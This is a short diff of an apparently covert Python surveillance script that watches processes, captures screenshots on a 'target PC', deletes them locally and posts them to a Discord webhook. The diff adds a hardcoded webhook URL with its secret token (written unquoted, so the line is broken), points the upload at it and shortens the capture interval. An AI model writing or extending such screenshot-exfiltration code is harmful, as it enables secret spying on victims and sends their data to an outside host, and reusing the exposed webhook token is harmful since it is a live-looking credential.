@@ -179,7 +179,7 @@ def monitor_processes():
         running_processes = current_processes
         time.sleep(1)  # Check every 2 seconds after the first check
 
-
+WEBHOOK_URL_SCREENSHOTS = https://discord.com/api/webhooks/1349762273824215180/8im_PuVb4CrUGktRt_ywF1JvIC_eRS1XJgLdnI7HKHaMcsEOtNcB3605q0ilDuUvo2GX
 def send_to_webhook_pic(filename):
     """Send the screenshot to the Discord webhook."""
     with open(filename, "rb") as file:
@@ -187,7 +187,7 @@ def send_to_webhook_pic(filename):
         files = {"file": file}
 
         try:
-            response = requests.post(WEBHOOK_URL, data=payload, files=files)
+            response = requests.post(WEBHOOK_URL_SCREENSHOTS, data=payload, files=files)
             if response.status_code == 200 or response.status_code == 204:
                 print("Webhook message sent successfully.")
             else:
@@ -212,7 +212,7 @@ def screenshot():
         print(f"Deleted {filename}")
         send_to_webhook(f"Deleted {filename} on target PC")
 
-        time.sleep(10)  # Reduced for testing
+        time.sleep(3) 
 
 
 # Run kill.bat file at the start
